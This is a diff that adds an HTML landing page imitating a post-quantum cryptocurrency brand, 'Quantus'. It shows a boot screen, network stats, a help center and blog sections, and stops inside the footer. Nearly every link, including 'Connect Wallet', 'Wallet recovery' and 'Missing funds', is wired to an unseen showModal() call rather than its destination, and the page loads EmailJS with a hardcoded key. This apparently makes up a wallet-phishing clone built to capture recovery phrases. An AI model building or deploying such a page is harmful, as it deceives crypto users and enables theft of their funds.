@@ -1,0 +1,1260 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Quantus - Quantum-Secure Encrypted Money</title>
+  <meta name="description"
+    content="Quantus is quantum-secure encrypted money on Layer 1. Download the wallet for post-quantum protected assets, private transfers, and reversible transactions." />
+  <meta name="theme-color" content="#0d0d0d" />
+  <meta property="og:title" content="Quantus - Quantum-Secure Encrypted Money" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image" content="assets/quantus-banner.png" />
+
+  <!-- Boot flag: runs before paint so the boot screen never flashes for returning visitors -->
+  <script>
+    (function () {
+      var root = document.documentElement;
+      root.classList.add('js');
+      try { if (!sessionStorage.getItem('quantus-booted')) root.classList.add('boot-active'); } catch (e) { }
+    })();
+  </script>
+
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("7tpKliu3iA0wJbT5q");
+    })();
+  </script>
+
+  <!-- Fonts: swap --sans / --mono / --logo in css/style.css if you get the originals -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&family=Michroma&display=swap"
+    rel="stylesheet" />
+  <!-- Remix Icon -->
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.3.0/fonts/remixicon.css" rel="stylesheet" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+
+<body>
+
+  <!-- ============ BOOT SCREEN ============ -->
+  <div class="boot" id="boot" aria-hidden="true">
+    <div class="boot__lines">
+      <p class="boot__line">&gt; QUANTUS PROTOCOL v1.0.0-gm</p>
+      <p class="boot__line">&gt; SYSTEM INTEGRITY <span class="ok">[PASS]</span></p>
+      <p class="boot__line">&gt; NIST FIPS 204 MODULE LOADED <span class="ok">[OK]</span></p>
+      <p class="boot__line">&gt; INITIALIZING <span class="hot">ML-DSA / DILITHIUM-5</span>...</p>
+      <p class="boot__line">&gt; POST-QUANTUM SIGNATURE SCHEME <span class="ok">ACTIVE</span></p>
+      <p class="boot__line">&gt; P2P COMM LAYER → <span class="hot">PQ-ENCRYPTED TUNNEL</span></p>
+      <p class="boot__line">&gt; RECURSIVE ZK PROOF ENGINE <span class="ok">READY</span></p>
+      <p class="boot__line">&gt; SYNCING MAINNET... &nbsp;PEERS: <span class="hot">247</span></p>
+      <p class="boot__line">&gt; CHLADNI FIELD VISUALIZER <span class="hot">LOADING</span></p>
+      <p class="boot__line boot__line--cursor">&gt; <span class="boot__caret"></span></p>
+    </div>
+    <canvas class="boot__canvas" id="bootCanvas"></canvas>
+  </div>
+
+  <!-- ============ HEADER / NAV (sticky) ============ -->
+  <header class="nav" id="nav">
+    <div class="nav__bar">
+      <!-- LOGO PLACEHOLDER: replace the contents of .logo with your <img> -->
+      <a href="#top" class="logo" aria-label="Quantus home">
+        <img src="img/quantuslogo.png" alt="">
+      </a>
+
+      <nav class="nav__links" aria-label="Primary">
+        <a href="#technology" onclick="showModal()">Technology</a>
+        <a href="#wallet" onclick="showModal()">Wallet</a>
+        <a href="#blog" onclick="showModal()">Blog</a>
+        <a href="#community" onclick="showModal()">Community</a>
+        <a href="https://docs.quantus.com/" target="_blank" rel="noopener" onclick="showModal()">Docs</a>
+        <a href="#qday-checker" onclick="showModal()">Q-Day Checker</a>
+      </nav>
+
+      <div class="nav__actions">
+        <a href="#wallet" class="btn btn--nav" onclick="showModal()">Connect Wallet</a>
+        <button class="burger" id="burger" type="button" aria-label="Open menu" aria-expanded="false"
+          aria-controls="mobileMenu">
+          <span></span><span></span><span></span>
+        </button>
+      </div>
+    </div>
+
+    <!-- Mobile menu (slides down from top) -->
+    <div class="mobile-menu" id="mobileMenu" aria-hidden="true">
+      <nav class="mobile-menu__inner" aria-label="Mobile">
+        <a href="#technology" onclick="showModal()">Technology</a>
+        <a href="#wallet" onclick="showModal()">Wallet</a>
+        <a href="#blog" onclick="showModal()">Blog</a>
+        <a href="#community" onclick="showModal()">Community</a>
+        <a href="https://docs.quantus.com/" target="_blank" rel="noopener" onclick="showModal()">Docs</a>
+        <a href="#qday-checker" onclick="showModal()">Q-Day Checker</a>
+        <a href="#wallet" class="btn btn--solid btn--block mobile-menu__cta" onclick="showModal()">Connect Wallet</a>
+      </nav>
+    </div>
+  </header>
+
+  <main id="top">
+
+    <!-- ============ HERO ============ -->
+    <section class="hero" id="hero">
+      <canvas class="hero__field" id="heroField" aria-hidden="true"></canvas>
+
+      <div class="hero__inner">
+        <p class="eyebrow">Quantum-Secure Encrypted Money</p>
+        <h1 class="hero__title">Money quantum computers can't break.</h1>
+        <p class="hero__sub">Quantus is quantum secure encrypted money. 21M supply cap. Proof of Work, and privacy
+          preserving</p>
+        <div class="hero__actions">
+          <button onclick="showModal()" class="btn btn--solid">Connect Wallet</button>
+          <a href="https://www.quantus.com/whitepaper" class="btn btn--outline" target="_blank" rel="noopener"
+            onclick="showModal()">Read
+            Whitepaper</a>
+        </div>
+      </div>
+
+      <div class="wave" aria-hidden="true">
+        <span class="wave__label">Wave mode (m,n)</span>
+        <span class="wave__value" id="waveValue">1,2</span>
+        <span class="wave__hint">Move cursor to shift frequency</span>
+      </div>
+
+      <!-- Infinite marquee (items are duplicated by js/main.js) -->
+      <div class="marquee" aria-label="Network statistics">
+        <div class="marquee__track" data-marquee>
+          <ul class="marquee__group">
+            <li class="stat stat--live"><span class="stat__label">Block height</span><span
+                class="stat__value stat__value--accent" data-stat="block-height">190,705</span></li>
+            <li class="stat"><span class="stat__label">QTPS</span><span class="stat__value" data-stat="qtps">430</span>
+            </li>
+            <li class="stat stat--live"><span class="stat__label">Uptime</span><span
+                class="stat__value stat__value--accent" data-stat="uptime">51.56%</span></li>
+            <li class="stat stat--live"><span class="stat__label">Miners</span><span
+                class="stat__value stat__value--accent" data-stat="miners">305</span></li>
+            <li class="stat"><span class="stat__label">Mainnet</span><span class="stat__value"
+                data-stat="mainnet">9/9/26</span></li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ ISSUE CTAs (new) ============ -->
+    <section class="section support" id="support" aria-labelledby="support-title">
+      <div class="panel">
+        <i class="corner corner--tr"></i><i class="corner corner--bl"></i><i class="corner corner--br"></i>
+
+        <div class="panel__head">
+          <span class="label">Help center</span>
+          <span class="label label--status"><i class="dot"></i>Select an issue</span>
+        </div>
+
+        <div class="panel__row support__intro">
+          <h2 class="h2" id="support-title">Running into an issue?</h2>
+          <p class="support__lead">Pick the problem closest to yours and we'll point you to the right fix.</p>
+        </div>
+
+        <div class="support__group">
+          <p class="label support__group-label">Quantus issues</p>
+          <div class="issue-grid">
+            <button type="button" class="issue-btn" data-issue="explorer" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-compass-3-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Explorer issue</span>
+              <span class="issue-btn__desc">Blocks or transactions not showing</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="quantum-wallet" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-wallet-3-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Quantum wallet issue</span>
+              <span class="issue-btn__desc">Can't open, sync or use the app</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="quantum-balance" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-error-warning-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Quantum balance error</span>
+              <span class="issue-btn__desc">Balance looks wrong or shows zero</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="migration" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-arrow-left-right-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Migration issue</span>
+              <span class="issue-btn__desc">Moving funds or accounts over</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="bridging" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-links-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Bridging issue</span>
+              <span class="issue-btn__desc">Bridge to QTC stuck or failed</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="missing-funds" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-search-eye-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Missing funds</span>
+              <span class="issue-btn__desc">Sent or received, but not arrived</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="airdrop" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-gift-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Airdrop claim issue</span>
+              <span class="issue-btn__desc">Can't claim or don't see rewards</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="mining" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-cpu-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Mining issue</span>
+              <span class="issue-btn__desc">Miner won't connect or earn</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="support__group">
+          <p class="label support__group-label">General crypto issues</p>
+          <div class="issue-grid">
+            <button type="button" class="issue-btn" data-issue="pending-transaction" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-time-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Pending transaction</span>
+              <span class="issue-btn__desc">Waiting too long to confirm</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="failed-transaction" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-close-circle-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Failed transaction</span>
+              <span class="issue-btn__desc">Transfer rejected or reverted</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="wallet-recovery" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-key-2-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Wallet recovery</span>
+              <span class="issue-btn__desc">Lost access or recovery phrase</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="sync" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-refresh-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Sync problem</span>
+              <span class="issue-btn__desc">Node or wallet stuck syncing</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="scam-report" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-shield-keyhole-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Scam or phishing</span>
+              <span class="issue-btn__desc">Report a suspicious link or contact</span>
+            </button>
+            <button type="button" class="issue-btn" data-issue="other" onclick="showModal()">
+              <span class="issue-btn__icon"><i class="ri-customer-service-2-line"></i></span>
+              <i class="ri-arrow-right-up-line issue-btn__arrow" aria-hidden="true"></i>
+              <span class="issue-btn__title">Something else</span>
+              <span class="issue-btn__desc">Tell us what's going on</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ THE THREAT ============ -->
+    <section class="section threat" id="threat" aria-labelledby="threat-title">
+      <div class="panel">
+        <i class="corner corner--tr"></i><i class="corner corner--bl"></i><i class="corner corner--br"></i>
+
+        <div class="panel__head">
+          <span class="label">The Threat</span>
+          <span class="label label--status"><i class="dot dot--green"></i>Threat Level: Critical</span>
+        </div>
+
+        <div class="panel__row threat__headline">
+          <h2 class="h2" id="threat-title">$2.3 trillion in crypto. Zero quantum defense.</h2>
+        </div>
+
+        <div class="panel__row threat__qubits">
+          <p class="label">Qubits to Break Bitcoin</p>
+          <p class="threat__number" data-count="824">824</p>
+          <p class="threat__caption">logical qubits required for a cryptographically relevant quantum computer</p>
+        </div>
+
+        <div class="threat__grid">
+          <div class="threat__cell">
+            <p class="label">Bitcoin</p>
+            <p class="threat__algo">ECDSA-256</p>
+            <span class="badge badge--bad">Vulnerable</span>
+          </div>
+          <div class="threat__cell">
+            <p class="label">Ethereum</p>
+            <p class="threat__algo">ECDSA-256</p>
+            <span class="badge badge--bad">Vulnerable</span>
+          </div>
+          <div class="threat__cell">
+            <p class="label">Solana</p>
+            <p class="threat__algo">ED25519</p>
+            <span class="badge badge--bad">Vulnerable</span>
+          </div>
+          <div class="threat__cell">
+            <p class="label">Quantus</p>
+            <p class="threat__algo"><span>ML-DSA</span> <span>DILITHIUM-5</span></p>
+            <span class="badge badge--good">Secure</span>
+            <p class="threat__std">NIST FIPS 204</p>
+          </div>
+        </div>
+
+        <div class="panel__row threat__foot">
+          <p>The cryptography under every asset above has an expiry date. Quantus was built for a post-quantum future.
+          </p>
+          <a href="#technology" class="btn btn--outline" onclick="showModal()">See the cryptography</a>
+        </div>
+
+        <div class="panel__row threat__source">
+          <p class="label label--faint">Source: NIST Post-Quantum Cryptography Standardization · 2024</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ WHY QUANTUS ============ -->
+    <section class="section why" id="technology" aria-labelledby="why-title">
+      <p class="label why__eyebrow" id="why-title">Why Quantus</p>
+      <p class="why__statement">Quantus is quantum secure, private, scalable money. It uses NIST-approved post-quantum
+        cryptography, ZK for scaling, and PoW mining. Maximally fair tokenomics modeled after Bitcoin.</p>
+
+      <div class="spec">
+        <div class="spec__col">
+          <h3 class="spec__title">Post-Quantum Cryptography</h3>
+          <dl class="spec__list">
+            <div class="spec__row">
+              <dt>Algorithm</dt>
+              <dd>ML-DSA / Dilithium-5</dd><span aria-hidden="true">&gt;</span>
+            </div>
+            <div class="spec__row">
+              <dt>Standard</dt>
+              <dd>NIST FIPS 204</dd><span aria-hidden="true">&gt;</span>
+            </div>
+            <div class="spec__row">
+              <dt>Layer</dt>
+              <dd>Signatures · P2P · SSH</dd><span aria-hidden="true">&gt;</span>
+            </div>
+          </dl>
+        </div>
+        <div class="spec__col">
+          <h3 class="spec__title">Recursive ZK Proofs</h3>
+          <dl class="spec__list">
+            <div class="spec__row">
+              <dt>Type</dt>
+              <dd>Recursive STARKs</dd><span aria-hidden="true">&gt;</span>
+            </div>
+            <div class="spec__row">
+              <dt>Purpose</dt>
+              <dd>Scalability</dd><span aria-hidden="true">&gt;</span>
+            </div>
+            <div class="spec__row">
+              <dt>Throughput</dt>
+              <dd>430 QTPS</dd><span aria-hidden="true">&gt;</span>
+            </div>
+          </dl>
+        </div>
+        <div class="spec__col">
+          <h3 class="spec__title">Clean-Slate Architecture</h3>
+          <dl class="spec__list">
+            <div class="spec__row">
+              <dt>Type</dt>
+              <dd>Layer 1</dd><span aria-hidden="true">&gt;</span>
+            </div>
+            <div class="spec__row">
+              <dt>Approach</dt>
+              <dd>Ground-up build</dd><span aria-hidden="true">&gt;</span>
+            </div>
+            <div class="spec__row">
+              <dt>Migration</dt>
+              <dd>Not required</dd><span aria-hidden="true">&gt;</span>
+            </div>
+          </dl>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ THE COIN ============ -->
+    <section class="section coin" id="coin" aria-labelledby="coin-title">
+      <p class="label">The coin</p>
+      <h2 class="h2 coin__title" id="coin-title">Finishing what Bitcoin started.</h2>
+
+      <div class="cards cards--3">
+        <article class="card">
+          <h3 class="card__title">Superior money</h3>
+          <p class="card__text">QTC is secure, scalable, and private peer to peer electronic cash. QTC enters
+            circulation through Proof-of-Work: open participation, work in, coins out.</p>
+          <a href="https://docs.quantus.com/guides/mining/" class="link-mono" target="_blank" rel="noopener"
+            onclick="showModal()">Start
+            mining</a>
+        </article>
+        <article class="card">
+          <h3 class="card__title">Get QTC (coming soon)</h3>
+          <p class="card__text">QTC is accessible in our mobile app via NEAR intents. Bridge crypto from anywhere to
+            QTC.</p>
+        </article>
+        <article class="card">
+          <h3 class="card__title">Post-quantum security</h3>
+          <p class="card__text">Your keys.<br />Your coins.<br />Already quantum secure.</p>
+        </article>
+      </div>
+    </section>
+
+    <!-- ============ ECOSYSTEM ============ -->
+    <section class="section eco" id="wallet" aria-labelledby="eco-title">
+      <p class="label">The Ecosystem</p>
+      <h2 class="h2" id="eco-title">Tools. Entry Points to Quantus.</h2>
+
+      <div class="cards cards--3 cards--eco">
+        <article class="card card--eco">
+          <p class="label label--orange">Wallet</p>
+          <p class="card__lead">Download on iOS and Android.</p>
+          <div class="card__art" role="img" aria-label="Wallet app placeholder illustration">
+            <!-- ILLUSTRATION PLACEHOLDER -->
+            <svg viewBox="0 0 120 190" width="120" height="190" fill="none" stroke="#3a3a3a" stroke-width="1">
+              <rect x="4" y="4" width="112" height="182" />
+              <rect x="12" y="12" width="96" height="140" />
+              <line x1="60" y1="12" x2="60" y2="152" stroke-dasharray="2 4" stroke="#262626" />
+              <line x1="42" y1="168" x2="78" y2="168" />
+              <g fill="#555" stroke="none">
+                <circle cx="4" cy="4" r="2" />
+                <circle cx="116" cy="4" r="2" />
+                <circle cx="4" cy="186" r="2" />
+                <circle cx="116" cy="186" r="2" />
+                <circle cx="12" cy="12" r="1.5" />
+                <circle cx="108" cy="12" r="1.5" />
+                <circle cx="12" cy="152" r="1.5" />
+                <circle cx="108" cy="152" r="1.5" />
+              </g>
+              <g stroke="#e2582c" stroke-width="3.4" stroke-linecap="round">
+                <circle cx="58" cy="78" r="13" stroke-dasharray="64 14" transform="rotate(-20 58 78)" />
+                <path d="M62 82 L72 92 M66 79 L74 87 M60 86 L68 94" stroke-width="2.4" />
+              </g>
+            </svg>
+          </div>
+          <p class="card__status"><i class="dot dot--green"></i><span class="status--green">Public Beta Live</span></p>
+          <div class="card__buttons">
+            <a href="https://apps.apple.com/id/app/quantus/id6747967405" class="btn btn--ghost" target="_blank"
+              rel="noopener" onclick="showModal()">App Store</a>
+            <a href="https://play.google.com/store/apps/details?id=com.quantus.wallet&amp;pcampaignid=web_share"
+              class="btn btn--ghost" target="_blank" rel="noopener" onclick="showModal()">Google Play</a>
+          </div>
+        </article>
+
+        <article class="card card--eco">
+          <p class="label label--orange">Whitepaper</p>
+          <p class="card__lead">Learn about Quantus.</p>
+          <div class="card__art" role="img" aria-label="Whitepaper placeholder illustration">
+            <svg viewBox="0 0 150 100" width="150" height="100" fill="none">
+              <g stroke="#262626" stroke-width="1">
+                <path d="M5 5H140M5 35H140M5 65H140M5 95H140M5 5V95M40 5V95M75 5V95M110 5V95M140 5V95" />
+              </g>
+              <g fill="#4a4a4a">
+                <circle cx="5" cy="5" r="1.6" />
+                <circle cx="40" cy="5" r="1.6" />
+                <circle cx="75" cy="5" r="1.6" />
+                <circle cx="110" cy="5" r="1.6" />
+                <circle cx="140" cy="5" r="1.6" />
+                <circle cx="5" cy="35" r="1.6" />
+                <circle cx="75" cy="35" r="1.6" />
+                <circle cx="110" cy="35" r="1.6" />
+                <circle cx="140" cy="35" r="1.6" />
+                <circle cx="5" cy="65" r="1.6" />
+                <circle cx="40" cy="65" r="1.6" />
+                <circle cx="75" cy="65" r="1.6" />
+                <circle cx="140" cy="65" r="1.6" />
+                <circle cx="5" cy="95" r="1.6" />
+                <circle cx="40" cy="95" r="1.6" />
+                <circle cx="110" cy="95" r="1.6" />
+                <circle cx="140" cy="95" r="1.6" />
+              </g>
+              <g fill="#e2582c">
+                <circle cx="40" cy="35" r="2.6" />
+                <circle cx="110" cy="65" r="2.6" />
+                <circle cx="75" cy="95" r="2.6" />
+              </g>
+            </svg>
+          </div>
+          <p class="card__status"><i class="dot"></i><span>NIST FIPS 204</span></p>
+          <div class="card__buttons">
+            <a href="https://www.quantus.com/whitepaper" class="btn btn--ghost" target="_blank" rel="noopener"
+              onclick="showModal()">Read
+              Whitepaper</a>
+          </div>
+        </article>
+
+        <article class="card card--eco">
+          <p class="label label--orange">Network</p>
+          <p class="card__lead">View network activity.</p>
+          <div class="card__art" role="img" aria-label="Network placeholder illustration">
+            <svg viewBox="0 0 150 120" width="150" height="120" fill="none">
+              <g stroke="#3a3a3a" stroke-width="1">
+                <path d="M75 60 L12 8 M75 60 L120 6 M75 60 L5 62 M75 60 L135 64 M75 60 L26 112 M75 60 L100 108" />
+              </g>
+              <g fill="#555">
+                <circle cx="12" cy="8" r="2.6" />
+                <circle cx="120" cy="6" r="2.6" />
+                <circle cx="5" cy="62" r="2.6" />
+                <circle cx="135" cy="64" r="2.6" />
+                <circle cx="26" cy="112" r="2.6" />
+                <circle cx="100" cy="108" r="2.6" />
+              </g>
+              <circle cx="75" cy="60" r="7" fill="#2a1710" stroke="#a8431f" stroke-width="1" />
+              <circle cx="75" cy="60" r="2" fill="#e2582c" />
+            </svg>
+          </div>
+          <p class="card__status"><i class="dot"></i><span>247 Active Miners</span></p>
+          <div class="card__buttons">
+            <a href="https://explorer.quantus.com/" class="btn btn--ghost" target="_blank" rel="noopener"
+              onclick="showModal()">View
+              Explorer</a>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- ============ COMMUNITY ============ -->
+    <section class="section community" id="community" aria-labelledby="community-title">
+      <p class="label">Community</p>
+      <h2 class="h2" id="community-title">Get involved.</h2>
+
+      <div class="social-grid">
+        <article class="social">
+          <p class="social__name"><i class="ri-telegram-fill" aria-hidden="true"></i>Telegram</p>
+          <p class="social__text">Join the conversation</p>
+          <a href="https://t.me/quantusnetwork" class="btn btn--ghost" target="_blank" rel="noopener"
+            onclick="showModal()">Join Telegram</a>
+        </article>
+        <article class="social">
+          <p class="social__name"><i class="ri-twitter-x-fill" aria-hidden="true"></i>X</p>
+          <p class="social__text">Follow for updates</p>
+          <a href="https://x.com/QuantusNetwork" class="btn btn--ghost" target="_blank" rel="noopener"
+            onclick="showModal()">Follow on X</a>
+        </article>
+        <article class="social">
+          <p class="social__name"><i class="ri-instagram-line" aria-hidden="true"></i>Instagram</p>
+          <p class="social__text">Behind the scenes</p>
+          <a href="https://www.instagram.com/quantusnetwork/" class="btn btn--ghost" target="_blank" rel="noopener"
+            onclick="showModal()">Follow on IG</a>
+        </article>
+        <article class="social social--half">
+          <p class="social__name"><i class="ri-youtube-fill" aria-hidden="true"></i>YouTube</p>
+          <p class="social__text">Watch and learn</p>
+          <a href="https://youtu.be/qXvgN8GY_NY?si=ihiNb9HWizRNAAIE" class="btn btn--ghost" target="_blank"
+            rel="noopener">Watch
+            on YouTube</a>
+        </article>
+        <article class="social social--half">
+          <p class="social__name"><i class="ri-discord-fill" aria-hidden="true"></i>Discord</p>
+          <p class="social__text">Chat with the community</p>
+          <a href="https://discord.quantus.com" class="btn btn--ghost" target="_blank" rel="noopener"
+            onclick="showModal()">Join Discord</a>
+        </article>
+      </div>
+    </section>
+
+    <!-- ============ BLOG + PODCAST ============ -->
+    <section class="section blog" id="blog" aria-labelledby="blog-title">
+      <p class="label">Latest from Quantus</p>
+      <h2 class="h2" id="blog-title">Stay ahead of the quantum shift.</h2>
+
+      <p class="label blog__label">Blogs</p>
+      <div class="posts">
+        <a class="post" href="https://www.quantus.com/blog/q-day-quantum-and-the-impact-on-bitcoin"
+          onclick="showModal()">
+          <div class="post__main">
+            <p class="post__meta"><span class="post__date">Sep 30</span><span class="post__cat">Conversations</span></p>
+            <h3 class="post__title">Q-Day, Quantum, and the Impact on Bitcoin with Colton Dillion</h3>
+          </div>
+          <p class="post__desc">Postquant Labs CEO Colton Dillion joins Chris Smith to discuss quantum computing and why
+            Bitcoin must prepare before a cryptographic emergency arrives.</p>
+          <i class="ri-arrow-right-line post__arrow" aria-hidden="true"></i>
+        </a>
+        <a class="post" href="https://www.quantus.com/blog/weekly-update-09-30-2026" onclick="showModal()">
+          <div class="post__main">
+            <p class="post__meta"><span class="post__date">Sep 30</span><span class="post__cat">Weekly Update</span></p>
+            <h3 class="post__title">Quantus Weekly: Three Weeks on Mainnet</h3>
+          </div>
+          <p class="post__desc">Three weeks into Quantus mainnet: hashrate is 24 TH/s and difficulty is above 300T. The
+            testnet miner airdrop is live in the mobile app through December 1.</p>
+          <i class="ri-arrow-right-line post__arrow" aria-hidden="true"></i>
+        </a>
+        <a class="post" href="https://www.quantus.com/blog/weekly-update-09-16-2026" onclick="showModal()">
+          <div class="post__main">
+            <p class="post__meta"><span class="post__date">Sep 16</span><span class="post__cat">Weekly Update</span></p>
+            <h3 class="post__title">Quantus Weekly: Mainnet Is Live</h3>
+          </div>
+          <p class="post__desc">Quantus mainnet launched September 9 and has produced over 53,000 blocks since.
+            First-week mining, wallet, and ZK stats, plus where QTC will be tradable.</p>
+          <i class="ri-arrow-right-line post__arrow" aria-hidden="true"></i>
+        </a>
+      </div>
+      <a href="https://www.quantus.com/blog" class="link-mono link-mono--arrow" onclick="showModal()">View all posts <i
+          class="ri-arrow-right-line" aria-hidden="true"></i></a>
+
+      <p class="label blog__label blog__label--podcast">QDay Podcast</p>
+      <div class="podcast">
+        <div class="podcast__feature">
+          <!-- IMAGE PLACEHOLDER: episode thumbnail (16:9) -->
+          <a href="https://youtu.be/qXvgN8GY_NY?si=ihiNb9HWizRNAAIE" class="podcast__thumb" target="_blank"
+            rel="noopener" aria-label="Watch episode 24 on YouTube">
+            <span class="podcast__thumb-inner">
+              <i class="ri-play-circle-line" aria-hidden="true"></i>
+              <span>Episode 24 thumbnail</span>
+            </span>
+          </a>
+          <h3 class="podcast__title">#24 - Colton Dillion - Qday, Quantum and the impact on Bitcoin</h3>
+          <p class="podcast__time">3 weeks ago</p>
+          <a href="https://youtu.be/qXvgN8GY_NY?si=ihiNb9HWizRNAAIE" class="link-mono link-mono--arrow" target="_blank"
+            rel="noopener">Watch on YouTube <i class="ri-arrow-right-line" aria-hidden="true"></i></a>
+        </div>
+        <div class="podcast__ep">
+          <h3 class="podcast__title">#23 - Alex Pruden - Quantum and The Race to Upgrade</h3>
+          <p class="podcast__time">2 months ago</p>
+          <a href="https://www.youtube.com/watch?v=sO2ghX6Y__M" class="link-mono link-mono--arrow" target="_blank"
+            rel="noopener">Watch on YouTube <i class="ri-arrow-right-line" aria-hidden="true"></i></a>
+        </div>
+        <div class="podcast__all">
+          <a href="https://www.youtube.com/@QuantusNetwork" class="link-mono link-mono--arrow link-mono--lg"
+            target="_blank" rel="noopener">View all episodes <i class="ri-arrow-right-line" aria-hidden="true"></i></a>
+          <p>24 episodes on QDay Podcast</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ SUBSCRIBE ============ -->
+    <section class="section subscribe" id="subscribe" aria-labelledby="subscribe-title">
+      <div class="subscribe__inner">
+        <h2 class="h2" id="subscribe-title">The window is open.</h2>
+        <p class="subscribe__lead">Get QTC updates first.</p>
+
+        <form class="form" id="subscribeForm" novalidate>
+          <div class="form__names">
+            <input type="text" name="first_name" placeholder="First name" autocomplete="given-name"
+              aria-label="First name" required />
+            <input type="text" name="last_name" placeholder="Last name" autocomplete="family-name"
+              aria-label="Last name" required />
+          </div>
+          <div class="form__email">
+            <input type="email" name="email" placeholder="Enter your email" autocomplete="email"
+              aria-label="Email address" required />
+            <button type="submit" class="btn btn--solid">Subscribe</button>
+          </div>
+          <p class="form__note" id="formNote" role="status" aria-live="polite"
+            data-default="No spam. Unsubscribe anytime.">No spam. Unsubscribe anytime.</p>
+        </form>
+      </div>
+    </section>
+  </main>
+
+  <!-- ============ FOOTER ============ -->
+  <footer class="footer">
+    <div class="footer__brand">
+      <a href="#top" class="footer__logo" aria-label="Quantus" onclick="showModal()">Quantus</a>
+      <div class="footer__meta">
+        <button type="button" class="lang" aria-label="Language: US English" onclick="showModal()">
+          <span class="lang__flag">US</span><span>English</span><i class="ri-arrow-down-s-line" aria-hidden="true"></i>
+        </button>
+        <p class="footer__copy">© <span id="year">2026</span> Quantus.<br />All rights reserved.</p>
+      </div>
+    </div>
+
+    <div class="footer__nav">
+      <div class="footer__col">
+        <p class="label">Protocol</p>
+        <ul>
+          <li><a href="https://www.quantus.com/whitepaper" onclick="showModal()">Whitepaper</a></li>
+          <li><a href="#technology" onclick="showModal()">Technology</a></li>
+          <li><a href="https://explorer.quantus.com/" onclick="showModal()">Network</a></li>
+          <li><a href="#wallet" onclick="showModal()">Wallet</a></li>
+          <li><a href="https://research.quantus.com/" onclick="showModal()">Research</a></li>
+          <li><a href="https://docs.quantus.com/" onclick="showModal()">Documentation</a></li>
+          <li><a href="https://github.com/Quantus-Network" onclick="showModal()">GitHub</a></li>
+        </ul>
+      </div>
+      <div class="footer__col">
+        <p class="label">Community</p>
+        <ul>
+          <li><a href="https://t.me/quantusnetwork" onclick="showModal()">Telegram</a></li>
+          <li><a href="https://discord.quantus.com" onclick="showModal()">Discord</a></li>
+          <li><a href="https://x.com/QuantusNetwork" onclick="showModal()">X (Twitter)</a></li>
+          <li><a href="https://www.instagram.com/quantusnetwork/" onclick="showModal()">Instagram</a></li>
+          <li><a href="https://www.youtube.com/@QuantusNetwork">YouTube</a></li>
+        </ul>
+      </div>
+      <div class="footer__col">
+        <p class="label">Company</p>
+        <ul>
+          <li><a href="https://www.quantus.com/blog" onclick="showModal()">Blog</a></li>
+          <li><a href="#community" onclick="showModal()">QDay Podcast</a></li>
+          <li><a href="#subscribe" onclick="showModal()">Contact</a></li>
